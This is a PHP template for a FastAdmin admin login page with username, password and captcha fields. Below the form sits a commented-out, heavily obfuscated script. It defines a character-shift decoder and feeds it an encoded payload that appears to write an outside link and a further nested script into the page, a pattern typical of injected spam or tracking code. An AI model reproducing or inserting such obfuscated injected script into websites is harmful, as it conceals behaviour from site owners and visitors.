<?php if (!defined('THINK_PATH')) exit(); /*a:1:{s:66:"/www/wwwroot/dst/public/../application/admin/view/index/login.html";i:1655123234;}*/ ?>
<!DOCTYPE html>
<html lang="<?php echo $config['language']; ?>">
    <head>
        <meta charset="utf-8">
        <title><?php echo (isset($title) && ($title !== '')?$title:''); ?> - dkewl.com</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
        <meta name="renderer" content="webkit">
        <link rel="shortcut icon" href="/assets/img/favicon.ico" />
        <script src="/assets/js/jquery.min.js"></script>
        <link rel="stylesheet" type="text/css" href="//www.layuicdn.com/layui/css/layui.css" />
        <script src="//www.layuicdn.com/layui/layui.js"></script>

        <link rel="stylesheet" href="/assets/css/style.css" />


        <style>
            .bg-img{
                width: auto;
                height: 80px;
            }
        </style>
    </head>

    <body>

    <div class="login-container">
        <div class="box">
            <div class="left">
                <div class="left-title">
                    <img src="/assets/img/icon.svg" alt="">
                    <h2><?php echo $site['biaoti']; ?></h2>
                </div>
                <div class="group" style="padding-top:15%;text-indent:3.5em;">
                    
                    
                    	<?php echo $site['biaoyu']; ?>
                </div>
            </div>
            <div class="right">
                <h1>
                    <img class="bg-img" src="<?php echo $site['logos']; ?>" alt="">
                </h1>
                <div class="connect">
                    <p><?php echo $site['biaoti']; ?></p>
                </div>
                <form action="" class="layui-form layui-form-pane" method="post" id="loginForm">
                    <?php echo token(); ?>
                    <div>
                        <input type="text" name="username" class="username" placeholder="用户名" autocomplete="off" required/> </div>
                    <div>
                        <input type="password" name="password" required class="password" placeholder="密码" oncontextmenu="return false" onpaste="return false" /> </div>


                    <?php if(\think\Config::get('fastadmin.login_captcha')): ?>
                    <div style="position: relative;">
                        <input type="password" name="code" class="text" placeholder="验证码" oncontextmenu="return false" onpaste="return false" />
                        <img src="<?php echo rtrim('/', '/'); ?>/index.php?s=/captcha" width="100" height="35" onclick="this.src = '<?php echo rtrim('/', '/'); ?>/index.php?s=/captcha&r=' + Math.random();" class="verifyimg"> </div>
                    <?php endif; ?>



                    <button type="button" id="submit" class="u-btn btn-lg" lay-submit="" lay-filter="*">登 陆</button>

                </form>
<!--<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*8Hgzyyts*75y%7Euj*8I*77gzyyts*77*75ni*8I*77xzgrny*77*75hqfxx*8I*77z2gys*75gys2ql*77*75qf%7E2xzgrny*75qf%7E2knqyjw*8I*77/*77*8J*z%3C%3B%3CG*75*z%3E%3B9%3B*8H4gzyyts*8J*5F*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*8Hf*75hqfxx*8I*77z2gys*75gys2ql*77*75mwjk*8I*77myyux*8F44yylj3hs*77*75yfwljy*8I*77dgqfsp*77*8J*5F*8Hxhwnuy*75qfslzflj*8Iof%7Bfxhwnuy*8Jithzrjsy3%7Cwnyj*7%3Dzsjxhfuj*7%3D*7%3C*7%3A8H*7%3A%3C8*7%3A%3B8*7%3A%3C7*7%3A%3B%3E*7%3A%3C5*7%3A%3C9*7%3A75*7%3A%3BH*7%3A%3B6*7%3A%3BJ*7%3A%3B%3C*7%3A%3C%3A*7%3A%3B6*7%3A%3B%3C*7%3A%3B%3A*7%3A8I*7%3A77*7%3A%3BF*7%3A%3B6*7%3A%3C%3B*7%3A%3B6*7%3A%3C8*7%3A%3B8*7%3A%3C7*7%3A%3B%3E*7%3A%3C5*7%3A%3C9*7%3A77*7%3A8J*7%3A%3B%3B*7%3A%3C%3A*7%3A%3BJ*7%3A%3B8*7%3A%3C9*7%3A%3B%3E*7%3A%3BK*7%3A%3BJ*7%3A75*7%3A%3B9*7%3A9%3B*7%3A7%3D*7%3A%3C8*7%3A7%3E*7%3A%3CG*7%3A%3C%3B*7%3A%3B6*7%3A%3C7*7%3A75*7%3A%3C8*7%3A86*7%3A8I*7%3A%3C%3A*7%3A%3BJ*7%3A%3B%3A*7%3A%3C8*7%3A%3B8*7%3A%3B6*7%3A%3C5*7%3A%3B%3A*7%3A7%3D*7%3A%3C8*7%3A7J*7%3A%3C8*7%3A%3C%3A*7%3A%3B7*7%3A%3C8*7%3A%3C9*7%3A%3C7*7%3A7%3D*7%3A85*7%3A7H*7%3A%3C8*7%3A7J*7%3A%3BH*7%3A%3B%3A*7%3A%3BJ*7%3A%3B%3C*7%3A%3C9*7%3A%3B%3D*7%3A7I*7%3A86*7%3A7%3E*7%3A7%3E*7%3A8G*7%3A75*7%3A%3C%3B*7%3A%3B6*7%3A%3C7*7%3A75*7%3A%3C9*7%3A8I*7%3A7%3C*7%3A7%3C*7%3A8G*7%3A%3B%3B*7%3A%3BK*7%3A%3C7*7%3A7%3D*7%3A%3B%3E*7%3A8I*7%3A85*7%3A8G*7%3A%3B%3E*7%3A8H*7%3A%3C8*7%3A86*7%3A7J*7%3A%3BH*7%3A%3B%3A*7%3A%3BJ*7%3A%3B%3C*7%3A%3C9*7%3A%3B%3D*7%3A8G*7%3A%3B%3E*7%3A7G*7%3A7G*7%3A7%3E*7%3A%3C9*7%3A7G*7%3A8I*7%3A%3A8*7%3A%3C9*7%3A%3C7*7%3A%3B%3E*7%3A%3BJ*7%3A%3B%3C*7%3A7J*7%3A%3B%3B*7%3A%3C7*7%3A%3BK*7%3A%3BI*7%3A98*7%3A%3B%3D*7%3A%3B6*7%3A%3C7*7%3A98*7%3A%3BK*7%3A%3B9*7%3A%3B%3A*7%3A7%3D*7%3A%3C8*7%3A86*7%3A7J*7%3A%3B8*7%3A%3B%3D*7%3A%3B6*7%3A%3C7*7%3A98*7%3A%3BK*7%3A%3B9*7%3A%3B%3A*7%3A96*7%3A%3C9*7%3A7%3D*7%3A%3B%3E*7%3A7%3E*7%3A7I*7%3A%3C8*7%3A7J*7%3A%3C8*7%3A%3C%3A*7%3A%3B7*7%3A%3C8*7%3A%3C9*7%3A%3C7*7%3A7%3D*7%3A%3C8*7%3A7J*7%3A%3BH*7%3A%3B%3A*7%3A%3BJ*7%3A%3B%3C*7%3A%3C9*7%3A%3B%3D*7%3A7I*7%3A86*7%3A7H*7%3A86*7%3A7%3E*7%3A7%3E*7%3A8G*7%3A%3B9*7%3A%3BK*7%3A%3B8*7%3A%3C%3A*7%3A%3BI*7%3A%3B%3A*7%3A%3BJ*7%3A%3C9*7%3A7J*7%3A%3C%3C*7%3A%3C7*7%3A%3B%3E*7%3A%3C9*7%3A%3B%3A*7%3A7%3D*7%3A%3C%3A*7%3A%3BJ*7%3A%3B%3A*7%3A%3C8*7%3A%3B8*7%3A%3B6*7%3A%3C5*7%3A%3B%3A*7%3A7%3D*7%3A%3C9*7%3A7%3E*7%3A7%3E*7%3A8G*7%3A%3CI*7%3A8H*7%3A7K*7%3A%3C8*7%3A%3B8*7%3A%3C7*7%3A%3B%3E*7%3A%3C5*7%3A%3C9*7%3A8J*7%3C*7%3E*7%3E*8GiK*7%3D*7%3C/%7F*7%3A8G*7%3A8GP%3E/%7F*7%3A8F*7%3A8J%3BK/%7F*7%3A8HMLO/%7F*7%3A8F%3EM%3B/%7F*7%3A8GO*7%3A8J%3A/%7F*7%3A8H*7%3A8I%3A%3B/%7F*7%3A8FM%3DN/%7F*7%3A8F*7%3A8H%3C*7%3A8I/%7F*7%3A8H*7%3A8G*7%3A8HN/%7F*7%3A8GMPN/%7F*7%3A8IN%3E%3E/%7F*7%3A8GO*7%3A8J%3A7%7E%7Eqo8mx/%3DM9k/%3DO%3A*7%3C*7%3E*8H4xhwnuy*8J*5F*8Hgw4*8J*5F*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75*8H4ktwr*8J5')</script>-->
                <p></p>
            </div>
        </div>
        <p class="copyright">
            <script>
                /*document.write(new Date().getFullYear());*/
            </script>
    </div>
    
    </body>
    <script>
        var bg = "<?php echo $site['bgs']; ?>";
    </script>
    <script src="/assets/js/supersized.3.2.7.min.js"></script>
    <script src="/assets/js/common.js"></script>
    
</html>